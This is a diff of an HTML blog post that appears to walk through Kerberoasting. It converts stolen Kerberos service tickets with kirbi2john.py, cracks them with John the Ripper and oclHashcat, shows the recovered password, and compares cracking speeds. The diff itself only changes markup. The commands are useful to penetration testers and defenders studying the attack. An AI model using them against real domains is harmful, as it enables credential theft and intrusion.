@@ -26,13 +26,13 @@
 &lt;li&gt;Format added September 30th 2015: &lt;a href=&#34;https://github.com/magnumripper/JohnTheRipper/commit/05e514646dfe5aa65ee48774571c0169f7e25a53&#34;&gt;https://github.com/magnumripper/JohnTheRipper/commit/05e514646dfe5aa65ee48774571c0169f7e25a53&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;If you aren&amp;rsquo;t already using the &lt;a href=&#34;https://github.com/magnumripper/JohnTheRipper&#34;&gt;magnumripper version of John The Ripper&lt;/a&gt; you should be, it&amp;rsquo;s the latest and great and usually has all of the updated formats, fixes, and speedups. In this case it&amp;rsquo;s also the only version that has the KRB5TGS format.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;root@wpad:~/johntheripper/run# ./kirbi2john.py /root/empire-dev/downloads/BDW3E2G2ZRKCUS3B/*.kirbi &amp;gt; /tmp/johnkirb.txt
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@wpad:~/johntheripper/run# ./kirbi2john.py /root/empire-dev/downloads/BDW3E2G2ZRKCUS3B/*.kirbi &amp;gt; /tmp/johnkirb.txt
 
 root@wpad:~/johntheripper/run# ./john /tmp/johnkirb.txt --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
 Loaded 11 password hashes with 11 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
 Warning: OpenMP is disabled; a non-OpenMP build may be faster
-Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status
 0g 0:00:00:07 3.35% (ETA: 23:38:44) 0g/s 69751p/s 767263c/s 767263C/s 129700..123junior
 ASDqwe123        ($krb5tgs$unkown)
 ASDqwe123        ($krb5tgs$unkown)
@@ -46,13 +46,13 @@ ASDqwe123        ($krb5tgs$unkown)
 &lt;a href=&#34;https://github.com/hashcat/oclHashcat/blob/master/docs/BUILD.md&#34;&gt;https://github.com/hashcat/oclHashcat/blob/master/docs/BUILD.md&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;Problem is that we have hashes in John the Ripper format and we have to get them into a format that oclHashcat understands:&lt;/p&gt;
 &lt;p&gt;Example Hashes: &lt;a href=&#34;https://hashcat.net/wiki/doku.php?id=example_hashes&#34;&gt;https://hashcat.net/wiki/doku.php?id=example_hashes&lt;/a&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;13100	Kerberos 5 TGS-REP etype 23 - $krb5tgs$23$*user$realm$test/spn*$140964709dbdeccbc6121b675ccfb8b2$af937e9d5691b74600e514a3105976f1a8ddb2eed3aeb008ea74ff50bee7a65f14e8c1cbbc360687e6d867c9fbe2e4b2004d0584f0c283a18f613c69c756f78c001647e01da84466f59c655a25913b0cb4e42f0dc88f461e921441da40d6fb56d40545f71b841d00f019f135eb93c2357253796e5dc7da8a455d4fe17c966c3ea3ac620eb5e51c44c8a9cc48d385680c64c519e2113497315e7d7623044d48e2272bd9836b754755c3494040b487757a936780daeff859dd2c8839
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;13100	Kerberos 5 TGS-REP etype 23 - $krb5tgs$23$*user$realm$test/spn*$140964709dbdeccbc6121b675ccfb8b2$af937e9d5691b74600e514a3105976f1a8ddb2eed3aeb008ea74ff50bee7a65f14e8c1cbbc360687e6d867c9fbe2e4b2004d0584f0c283a18f613c69c756f78c001647e01da84466f59c655a25913b0cb4e42f0dc88f461e921441da40d6fb56d40545f71b841d00f019f135eb93c2357253796e5dc7da8a455d4fe17c966c3ea3ac620eb5e51c44c8a9cc48d385680c64c519e2113497315e7d7623044d48e2272bd9836b754755c3494040b487757a936780daeff859dd2c8839
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you got your tickets from &lt;strong&gt;kirbi2john.py&lt;/strong&gt; you can convert them using&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;cat kirbi2johnoutput.txt | sed &#39;s/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/&#39;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cat kirbi2johnoutput.txt | sed &amp;#39;s/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/&amp;#39;
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you got them from &lt;strong&gt;Impacket&lt;/strong&gt;, they are already in a format that is compatible with both John the Ripper and oclHashcat.&lt;/p&gt;
 &lt;p&gt;Here is the speed results that Atom was getting using his AMD R9 GPU:&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;http://pastebin.com/raw/3eHx2bFr&#34;&gt;http://pastebin.com/raw/3eHx2bFr&lt;/a&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;root@sf:~/oclHashcat# ./oclHashcat -m 13100 hash -w 3 -a 3 ?l?l?l?l?l?l?l 
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@sf:~/oclHashcat# ./oclHashcat -m 13100 hash -w 3 -a 3 ?l?l?l?l?l?l?l 
 oclHashcat v2.01 (g0891e39) starting...
 
 Device #1: Hawaii, 2858/4025 MB allocatable, 1010Mhz, 44MCU
@@ -95,7 +95,7 @@ HWMon.GPU.#1...:  0% Util, 42c Temp, 20% Fan
 Started: Wed Feb 17 08:33:57 2016
 Stopped: Wed Feb 17 08:34:04 2016
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Where I was only getting about half of that speed against one hash (NVidia GTX 970):&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;Session.Name...: oclHashcat
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Session.Name...: oclHashcat
 Status.........: Running
 Rules.Type.....: File (rules\dive.rule)
 Input.Mode.....: File (..\dictionarys\rockyou.txt)
@@ -106,7 +106,7 @@ Time.Estimated.: Sun May 22 09:04:48 2016 (7 hours, 31 mins)
 Speed.Dev.#1...: 57894.8 kH/s (14.37ms)
 Recovered......: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And as you can see, going against 100 hashes pushed the wait time out to 30 days vs. 7 hours.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;Session.Name...: oclHashcat
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Session.Name...: oclHashcat
 Status.........: Running
 Rules.Type.....: File (rules\dive.rule)
 Input.Mode.....: File (..\dictionarys\rockyou.txt)
